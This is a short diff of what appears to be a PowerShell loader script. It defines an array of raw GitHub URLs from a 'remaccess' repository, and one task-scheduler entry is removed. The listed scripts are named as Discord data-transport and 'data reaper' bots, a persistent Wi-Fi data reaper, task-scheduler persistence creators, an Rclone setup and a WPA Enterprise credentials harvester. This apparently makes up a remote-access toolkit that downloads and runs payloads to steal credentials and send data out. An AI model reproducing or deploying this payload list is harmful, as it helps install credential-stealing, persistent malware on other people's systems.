@@ -53,7 +53,6 @@ $actions = @(
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscordDataTransportBot.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscordAutoDataReaperBots.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/WifiPersistentDataReaper.ps1",
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/TaskSchedulerServiceCreater.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/PingTaskSchedulerCreator.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/Miscellaneous/RcloneSetup.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/WPAEnterpriseCredentialsHarvester.ps1",
